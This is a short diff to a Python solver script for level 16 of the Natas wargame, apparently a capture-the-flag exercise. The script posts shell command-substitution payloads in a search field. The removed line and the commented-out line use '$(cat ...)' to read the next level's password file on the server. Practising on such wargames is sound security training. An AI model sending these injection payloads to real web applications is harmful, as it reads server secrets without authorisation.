@@ -10,7 +10,9 @@ from natas_utils import *
 LEVEL = 16
 
 def solve(url: str, login: LevelLogin) -> Optional[str]:
-    payload = f"$(cat {NATAS_DATA['flag_path']}natas{LEVEL})"
+    flag_file_abspath = NATAS_DATA['flag_path'] + f"natas{LEVEL + 1}"
+
+    payload = f"$(echo aa)" # "$(cat {flag_file_abspath} > dictionary.txt)"
     response = requests.post(url, auth=login, data={"needle": payload})
 
     print(response.text)
